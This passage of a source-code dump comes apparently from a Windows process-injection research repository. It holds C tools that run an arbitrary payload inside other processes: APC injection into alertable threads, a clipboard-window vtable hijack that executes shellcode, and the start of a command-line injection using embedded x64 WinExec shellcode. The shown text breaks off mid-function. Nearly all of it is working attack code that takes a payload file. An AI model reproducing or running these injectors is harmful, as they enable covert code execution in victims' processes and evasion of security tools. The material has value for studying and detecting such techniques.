    h[2] = CreateFile(L"alert.exe", GENERIC_READ, 
      FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // resolve address of SetEvent 
    f = GetProcAddress(GetModuleHandle(L"kernel32"), "SetEvent");
    ht = CreateThread(NULL, 0, ThreadProc, h, 0, NULL);
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(GetCurrentProcess(), NULL, TRUE);
    
    for(i=0; i<sizeof(api)/sizeof(char*); i++) {
      //printf("Press any key to continue...\n");
      //getchar();
      Sleep(500);
      
      c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
      GetThreadContext(ht, &c);
      printf("\nPC: %p %ws\n", 
        (LPVOID)c.Rip, addr2sym(GetCurrentProcess(), (LPVOID)c.Rip));
      printf("Queuing APC for %s.\n", api[i]);
      // queue APC for alertable thread
      QueueUserAPC(f, ht, (ULONG_PTR)h);
    }
    // wait for thread to end
    WaitForSingleObject(ht, INFINITE);
    // cleanup and exit
    SymCleanup(GetCurrentProcess());
    CloseHandle(ht);
    CloseHandle(h[0]);
    CloseHandle(h[1]);
    CloseHandle(h[2]);
    
    return 0;
}


```

`apc/apc.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

// Try to find thread in alertable state for opened process.
// This is based on code used in AtomBombing technique.
//
// https://github.com/BreakingMalwareResearch/atom-bombing
//
HANDLE find_alertable_thread1(HANDLE hp, DWORD pid) {
    DWORD         i, cnt = 0;
    HANDLE        evt[2], ss, ht, h = NULL, 
      hl[MAXIMUM_WAIT_OBJECTS],
      sh[MAXIMUM_WAIT_OBJECTS],
      th[MAXIMUM_WAIT_OBJECTS];
    THREADENTRY32 te;
    HMODULE       m;
    LPVOID        f, rm;
    
    // 1. Enumerate threads in target process
    ss = CreateToolhelp32Snapshot(
      TH32CS_SNAPTHREAD, 0);
      
    if(ss == INVALID_HANDLE_VALUE) return NULL;

    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        // otherwise, add to list
        hl[cnt++] = ht;
        // if we've reached MAXIMUM_WAIT_OBJECTS. break
        if(cnt == MAXIMUM_WAIT_OBJECTS) break;
      } while(Thread32Next(ss, &te));
    }

    // Resolve address of SetEvent
    m  = GetModuleHandle(L"kernel32.dll");
    f  = GetProcAddress(m, "SetEvent");
    
    for(i=0; i<cnt; i++) {
      // 2. create event and duplicate in target process
      sh[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
      
      DuplicateHandle(
        GetCurrentProcess(),  // source process
        sh[i],                // source handle to duplicate
        hp,                   // target process
        &th[i],               // target handle
        0, 
        FALSE, 
        DUPLICATE_SAME_ACCESS);
        
      // 3. Queue APC for thread passing target event handle
      QueueUserAPC(f, hl[i], (ULONG_PTR)th[i]);
    }

    // 4. Wait for event to become signalled
    i = WaitForMultipleObjects(cnt, sh, FALSE, 1000);
    if(i != WAIT_TIMEOUT) {
      // 5. save thread handle
      h = hl[i];
    }
    
    // 6. Close source + target handles
    for(i=0; i<cnt; i++) {
      CloseHandle(sh[i]);
      CloseHandle(th[i]);
      if(hl[i] != h) CloseHandle(hl[i]);
    }
    CloseHandle(ss);
    return h;
}

BOOL IsAlertable(HANDLE hp, HANDLE ht, LPVOID addr[6]) {
    CONTEXT   c;
    BOOL      alertable = FALSE;
    DWORD     i;
    ULONG_PTR p[8];
    SIZE_T    rd;
    
    // read the context
    c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(ht, &c);
    
    // for each alertable function
    for(i=0; i<6 && !alertable; i++) {
      // compare address with program counter
      if((LPVOID)c.Rip == addr[i]) {
        switch(i) {
          // ZwDelayExecution
          case 0 : {
            alertable = (c.Rcx & TRUE);
            break;
          }
          // NtWaitForSingleObject
          case 1 : {
            alertable = (c.Rdx & TRUE);
            break;
          }
          // NtWaitForMultipleObjects
          case 2 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtSignalAndWaitForSingleObject
          case 3 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtUserMsgWaitForMultipleObjectsEx
          case 4 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[5] & MWMO_ALERTABLE);
            break;
          }
          // NtRemoveIoCompletionEx
          case 5 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[6] & TRUE);
            break;
          }            
        }
      }
    }
    return alertable;
}
 
// based on idea suggested in :
// https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf
 
// thread to run alertable functions
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HANDLE           *evt = (HANDLE)lpParameter;
    HANDLE           port;
    OVERLAPPED_ENTRY lap;
    DWORD            n;
    
    SleepEx(INFINITE, TRUE);
    
    WaitForSingleObjectEx(evt[0], INFINITE, TRUE);
    
    WaitForMultipleObjectsEx(2, evt, FALSE, INFINITE, TRUE);
    
    SignalObjectAndWait(evt[1], evt[0], INFINITE, TRUE);
    
    ResetEvent(evt[0]);
    ResetEvent(evt[1]);
    
    MsgWaitForMultipleObjectsEx(2, evt, 
      INFINITE, QS_RAWINPUT, MWMO_ALERTABLE);
      
    port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    GetQueuedCompletionStatusEx(port, &lap, 1, &n, INFINITE, TRUE);
    CloseHandle(port);
    
    return 0;
}

HANDLE find_alertable_thread2(HANDLE hp, DWORD pid) {
    HANDLE        ss, ht, evt[2], h = NULL;
    LPVOID        rm, sevt, f[6];
    THREADENTRY32 te;
    SIZE_T        rd;
    DWORD         i;
    CONTEXT       c;
    ULONG_PTR     p;
    HMODULE       m;
    
    // using the offset requires less code but it may
    // not work across all systems.
#ifdef USE_OFFSET
    char *api[6]={
      "ZwDelayExecution", 
      "ZwWaitForSingleObject",
      "NtWaitForMultipleObjects",
      "NtSignalAndWaitForSingleObject",
      "NtUserMsgWaitForMultipleObjectsEx",
      "NtRemoveIoCompletionEx"};
      
    // 1. Resolve address of alertable functions
    for(i=0; i<6; i++) {
      m = GetModuleHandle(i == 4 ? L"win32u" : L"ntdll");
      f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
    }
#else
    // create thread to execute alertable functions
    evt[0] = CreateEvent(NULL, FALSE, FALSE, NULL);
    evt[1] = CreateEvent(NULL, FALSE, FALSE, NULL);
    ht     = CreateThread(NULL, 0, ThreadProc, evt, 0, NULL);
    
    // wait a moment for thread to initialize
    Sleep(100);
    
    // resolve address of SetEvent
    m      = GetModuleHandle(L"kernel32.dll");
    sevt   = GetProcAddress(m, "SetEvent");
    
    // for each alertable function
    for(i=0; i<6; i++) {
      // read the thread context
      c.ContextFlags = CONTEXT_CONTROL;
      GetThreadContext(ht, &c);
      // save address
      f[i] = (LPVOID)c.Rip;
      // queue SetEvent for next function
      QueueUserAPC(sevt, ht, (ULONG_PTR)evt);
    }
    // cleanup thread
    CloseHandle(ht);
    CloseHandle(evt[0]);
    CloseHandle(evt[1]);
#endif

    // Create a snapshot of threads
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    // check each thread
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        
        // found alertable thread?
        if(IsAlertable(hp, ht, f)) {
          // save handle and exit loop
          h = ht;
          break;
        }
        // else close it and continue
        CloseHandle(ht);
      } while(Thread32Next(ss, &te));
    }
    // close snap shot
    CloseHandle(ss);
    return h;
}

VOID apc_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
    HANDLE hp, ht;
    SIZE_T wr;
    LPVOID cs;
    
    // 1. Open target process
    hp = OpenProcess(
      PROCESS_DUP_HANDLE | 
      PROCESS_VM_READ    | 
      PROCESS_VM_WRITE   | 
      PROCESS_VM_OPERATION, 
      FALSE, pid);
      
    if(hp == NULL) {
      printf("unable to open process.\n");
      return;
    }
    // 2. Find an alertable thread
    ht = find_alertable_thread2(hp, pid);

    if(ht != NULL) {
      // 3. Allocate memory
      cs = VirtualAllocEx(
        hp, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        // 4. Write code to memory
        if(WriteProcessMemory(
          hp, 
          cs, 
          payload, 
          payloadSize, 
          &wr)) 
        {
          // 5. Run code
          QueueUserAPC(cs, ht, 0);
        } else {
          printf("unable to write payload to process.\n");
        }
        // 6. Free memory
        VirtualFreeEx(
          hp, 
          cs, 
          0, 
           MEM_RELEASE);
      } else {
        printf("unable to allocate memory.\n");
      }
    } else {
      printf("unable to find alertable thread.\n");
    }
    // 7. Close process
    CloseHandle(hp);
}

VOID list_threads(DWORD pid) {
    DWORD         i;
    HANDLE        ss, ht, hp;
    THREADENTRY32 te;
    HMODULE       m;
    LPVOID        f[6], rm;
    SIZE_T        rd;
    LPVOID        p[8];
    CONTEXT       c;
 
    char *api[6]={
      "ZwDelayExecution", 
      "ZwWaitForSingleObject",
      "NtWaitForMultipleObjects",
      "NtSignalAndWaitForSingleObject",
      "NtUserMsgWaitForMultipleObjectsEx",
      "NtRemoveIoCompletionEx"};
      
    hp = OpenProcess(
      PROCESS_DUP_HANDLE | 
      PROCESS_VM_READ    | 
      PROCESS_VM_WRITE   | 
      PROCESS_VM_OPERATION, 
      FALSE, pid);
      
    if(hp == NULL) return;
    
    // 1. Resolve address of alertable system calls
    for(i=0; i<6; i++) {
      m = GetModuleHandle(i == 4 ? L"win32u" : L"ntdll");
      f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
    }
    // 2. Create a snapshot of threads
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    // 3. Gather list of threads for target process
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        
        // suspend thread and obtain the context
        ZeroMemory(&c, sizeof(c));
        c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
        GetThreadContext(ht, &c);
        
        // for each alertable function, compare with the value of Rip register
        for(i=0; i<6; i++) {
          // if we have match
          if((LPVOID)c.Rip == f[i]) {
            switch(i) {
              // ZwDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
              case 0 : {
                printf("%s(Alertable=%s, DelayInterval=%p)\n", 
                  api[i], (c.Rcx & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.Rdx);
                break;
              }
              // ZwWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
              case 1 : {
                printf("%s(Handle=%p, Alertable=%s, Timeout=%p)\n", 
                  api[i], (LPVOID)c.Rcx, (c.Rdx & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.R8);
                break;
              }
              // NtWaitForMultipleObjects(ULONG ObjectCount, PHANDLE ObjectsArray, 
              //        OBJECT_WAIT_TYPE WaitType, DWORD Timeout, BOOLEAN Alertable, PLARGE_INTEGER Timeout); 
              case 2 : {
                // as with signal and wait, R9 is overwritten by the kernel. the value is saved in RSI
                // in event system call returns for any reason other than STATUS_ALERTED
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(ObjectCount=%lli, ObjectsArray=%p, WaitType=%s, Alertable=%s, Timeout=%p)\n", 
                  api[i], c.Rcx, (LPVOID)c.Rdx, 
                  (c.R8  & TRUE) ? "TRUE" : "FALSE", 
                  (c.Rsi & TRUE) ? "TRUE" : "FALSE", p[5]);
                break;
              }
              // NtSignalAndWaitForSingleObject(HANDLE SignalHandle, HANDLE WaitHandle, 
              //        BOOLEAN Alertable, PLARGE_INTEGER Timeout);
              case 3 : {
                // we can check RSI for TRUE or FALSE, but the use of this register might change in future, so it's unreliable
                // It seems that R8 is overwritten by the kernel. Rsi is still okay though.
                printf("%s(ObjectToSignal=%p, WaitableObject=%p, Alertable=%s, Timeout=%p)\n", 
                  api[i], (LPVOID)c.Rcx, (LPVOID)c.Rdx, (c.Rsi & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.R9);
                break;
              }
              // NtUserMsgWaitForMultipleObjectsEx(ULONG ObjectCount, PHANDLE ObjectsArray, 
              //        DWORD Timeout, DWORD WakeMask, DWORD Flags);
              case 4 : {
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(ObjectCount=%i, ObjectsArray=%p, Timeout=%lx, WakeMask=%lx, Alertable=%s)\n", 
                  api[i], (DWORD)c.Rcx, (LPVOID)c.Rdx, (DWORD)c.R8, (DWORD)c.R9, 
                  ((DWORD)p[5] & MWMO_ALERTABLE) ? "TRUE" : "FALSE");
                break;
              }
              // NtRemoveIoCompletionEx(HANDLE Port, FILE_IO_COMPLETION_INFORMATION *Info, ULONG Count,
              //        ULONG *Written, LARGE_INTEGER *Timeout, BOOLEAN alertable);
              case 5 : {
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(port=%lx, info=%p, count=%i, written=%p, timeout=%p, Alertable=%s)\n", 
                  api[i], (DWORD)c.Rcx, (LPVOID)c.Rdx, (DWORD)c.R8, (LPVOID)c.R9, 
                  p[5], ((DWORD)p[6] & TRUE) ? "TRUE" : "FALSE");
                break;
              }
            }
          }
        }
        CloseHandle(ht);
      } while(Thread32Next(ss, &te));
    }
    CloseHandle(ss);
    CloseHandle(hp);
}

int main(void) {
    LPVOID  pic;
    DWORD   len, pid;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc < 2) {
      printf("\nusage: apc_inject <process> <payload.bin>\n");
      return 0;
    }

    pid = name2pid(argv[1]);
    
    if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
    if(pid == 0) { 
      printf("unable to obtain process id for %ws\n", argv[1]);
      return 0;
    }
    
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    
    if(argc == 3) {
      len = readpic(argv[2], &pic);
      if (len == 0) { printf("\ninvalid payload\n"); return 0;}
      apc_inject(pid, pic, len);
    } else {
      list_threads(pid);
    }
    
    return 0;
}


```

`clipboard/clipboard.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

// fake interface
typedef struct _IUnknown_t {
    // a pointer to virtual function table
    ULONG_PTR lpVtbl;
    // the virtual function table
    ULONG_PTR QueryInterface;
    ULONG_PTR AddRef;
    ULONG_PTR Release;       // executed for WM_DESTROYCLIPBOARD
} IUnknown_t;

VOID clipboard(LPVOID payload, DWORD payloadSize) {
    HANDLE     hp;
    HWND       hw;
    DWORD      id;
    IUnknown_t iu;
    LPVOID     cs, ds;
    SIZE_T     wr;
    
    // 1. Find a private clipboard.
    //    Obtain the process id and open it
    hw = FindWindowEx(HWND_MESSAGE, NULL, L"CLIPBRDWNDCLASS", NULL);
    GetWindowThreadProcessId(hw, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 2. Allocate RWX memory in process and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 3. Allocate RW memory in process.
    //    Initialize and write IUnknown interface
    ds = VirtualAllocEx(hp, NULL, sizeof(IUnknown_t),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    iu.lpVtbl  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    iu.Release = (ULONG_PTR)cs;
    WriteProcessMemory(hp, ds, &iu, sizeof(IUnknown_t), &wr);
    
    // 4. Set the interface property and trigger execution
    SetProp(hw, L"ClipboardDataObjectInterface", ds);
    PostMessage(hw, WM_DESTROYCLIPBOARD, 0, 0);
    
    // 5. Release memory for code and data
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

// GetWindowModuleFileName doesn't always work for window handles

VOID list_clipboards(VOID) {
    HWND  hw = NULL;
    DWORD pid;
    
    printf("%-16s %-5s Process\n", "HWND", "PID");
    printf("*****************************************\n");
    
    for(;;) {
      hw = FindWindowEx(HWND_MESSAGE, hw, L"CLIPBRDWNDCLASS", NULL);
      if(hw == NULL) break;
      GetWindowThreadProcessId(hw, &pid);
      printf("%p %-5i %ws\n", (LPVOID)hw, pid, pid2name(pid));
    }
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc != 2) {
      list_clipboards();
      printf("\nusage: clipboard <payload>\n");
      return 0;
    }
    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    clipboard(pic, len);
    return 0;
}

```

`cmdline/bld.bat`:

```bat
@echo off
yasm -fbin -DBIN winexec1.asm -owinexec1.bin
yasm -fwin64 winexec1.asm -owinexec1.obj
cl /MD var_inject.c winexec1.obj
```

`cmdline/cmd_inject.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

// get the address of command line
PVOID get_cmdline(HANDLE hp, PDWORD cmdlen) {
    NTSTATUS                    nts;
    PROCESS_BASIC_INFORMATION   pbi;
    RTL_USER_PROCESS_PARAMETERS upp;
    PEB                         peb;
    ULONG                       len;
    SIZE_T                      rd;

    // get the address of PEB
    nts = NtQueryInformationProcess(
        hp, ProcessBasicInformation,
        &pbi, sizeof(pbi), &len);
    
    // get the address RTL_USER_PROCESS_PARAMETERS
    ReadProcessMemory(
      hp, pbi.PebBaseAddress,
      &peb, sizeof(PEB), &rd);
    
    // get the address of command line 
    ReadProcessMemory(
      hp, peb.ProcessParameters,
      &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);

    *cmdlen = upp.CommandLine.Length;
    return upp.CommandLine.Buffer;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"

void cmd_inject(PWCHAR cmd) {
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               path[MAX_PATH]={0};    
    INT                 i; 
    PVOID               va;
    DWORD               rva, old, len;
    PVOID               cmdline;
    HWND                npw, ecw;

    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
    
    // create a new process using shellcode as command line
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWDEFAULT;
    
    if(!CreateProcess(path, (PWCHAR)WINEXEC, NULL, NULL, 
      FALSE, 0, NULL, NULL, &si, &pi))
    {
      xstrerror(L"CreateProcess");
      goto cleanup;
    }
     
    // wait for process to initialize
    // if you don't wait, there can be a race condition
    // reading the correct command line from new process  
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // the command to execute is just pasted into the notepad
    // edit control.
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
